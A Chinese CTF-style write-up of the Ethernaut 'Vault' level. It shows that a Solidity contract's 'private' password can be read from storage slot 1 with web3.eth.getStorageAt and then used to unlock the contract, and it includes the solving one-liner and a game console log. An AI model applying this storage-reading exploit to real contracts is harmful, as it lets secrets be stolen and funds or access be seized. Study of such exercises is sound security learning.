# 09 Vault

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

目标: 找到密码, 调用`ulock`解锁

嗯~ 把密码直接存到合约中了, 还是在构造函数中明文存储的~



### web3.eth.getStorageAt

它允许您检索在以太坊区块链上指定存储地址上存储的值。该方法接受两个参数：您要访问其存储的合约地址，以及您要读取的存储地址。它将指定地址存储的值作为十六进制字符串返回。

例如，如果您想要检索地址为 0xabc123 的合约的存储地址 0x01 上存储的值，您可以使用以下代码：

```js
web3.eth.getStorageAt("0xabc123", "0x01", (error, result) => {
  if (error) {
    console.log(error);
  } else {
    console.log(result);
  }
});
```

此方法通常用于读取以太坊区块链上智能合约的值，例如特定账户的余额或特定合约变量的状态。但是，它也可以用于读取存储在区块链上的任何数据，包括交易和区块。

### 数据存储

智能合约的数据存储分为两种类型：永久存储和临时存储。

永久存储是指在智能合约部署时创建的存储，它存储在区块链上并且不会被删除。智能合约可以通过执行指令来更新永久存储中的数据，但是不能直接删除。

临时存储是指在智能合约执行时临时创建的存储，它存储在智能合约执行的节点上，在智能合约执行完成后会被删除。临时存储通常用于执行某些计算，或者在多次执行智能合约时保留中间状态。

在智能合约中，数据存储的访问和更新是通过特定的指令来完成的。智能合约编程语言（如 Solidity）提供了用于访问和更新存储的特定语法。例如，在 Solidity 中，可以使用 `storage` 关键字来访问智能合约的存储，并使用类似于变量赋值的语法来更新存储.



在智能合约中，状态变量（也称为存储变量）被存储在永久存储中。智能合约的永久存储是一个键值对的映射，其中键是存储地址，值是存储在该地址上的数据。

智能合约的状态变量是按照它们在智能合约代码中出现的顺序进行排列的。例如，如果智能合约中的第一个状态变量是 `counter`，第二个状态变量是 `timestamp`，那么 `counter` 的存储地址就是 0，`timestamp` 的存储地址就是 1。

需要注意的是，智能合约存储中的数据是以十六进制字符串的形式返回的。如果需要将这些数据转换为可读的格式，需要使用特定的解码方法。例如，如果存储中的数据是一个整数值，那么可以使用 `web3.utils.hexToNumber` 方法将它转换为 JavaScript 中的数字类型。



![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1670503500650626000.png?raw=true)



## 答案

```js
await contract.unlock(await web3.eth.getStorageAt(instance,1))
```

注意,  `unlock` 函数的参数是 `bytes32`  所以直接用`getStorageAt`的返回值就可以了

如果参数是字符串, 需要将返回值转换为字符串

```js
let p = await web3.eth.getStorageAt(instance,1);
let s = web3.utils.hexToString(p)
```





```
^^.js:45 ╚(▲_▲)╝ 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:46:43.532
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xbb5ac193415812ac3c19c6c3383b27f5c8cdf26bfd7b856edd44afe2ad3be08b
^^.js:35 => 实例地址0x11e3C6044C510423815AdD138a6865f2F8a1F22F
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:46:49.331
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xbb5ac193415812ac3c19c6c3383b27f5c8cdf26bfd7b856edd44afe2ad3be08b
await contract.unlock(await web3.eth.getStorageAt(instance,1))
redux-logger.js:1  action SET_BLOCK_NUM @ 16:46:59.066
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x3e5cd647750d2bcbb058a2d48a07d594488fc023a0dcabe1156eed60172a7a31
{tx: "0x3e5cd647750d2bcbb058a2d48a07d594488fc023a0dcabe1156eed60172a7a31", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x3e5cd647750d2bcbb058a2d48a07d594488fc023a0dcabe1156eed60172a7a31
^^.js:45 O=('-'Q) 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 16:47:03.879
redux-logger.js:1  action SET_BLOCK_NUM @ 16:47:09.064
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xf98f4dba8da704dffc3b9378d9fa23f4a73f64f9d8946a216a918ceeeceb93b6
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xf98f4dba8da704dffc3b9378d9fa23f4a73f64f9d8946a216a918ceeeceb93b6
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 16:47:19.064

```

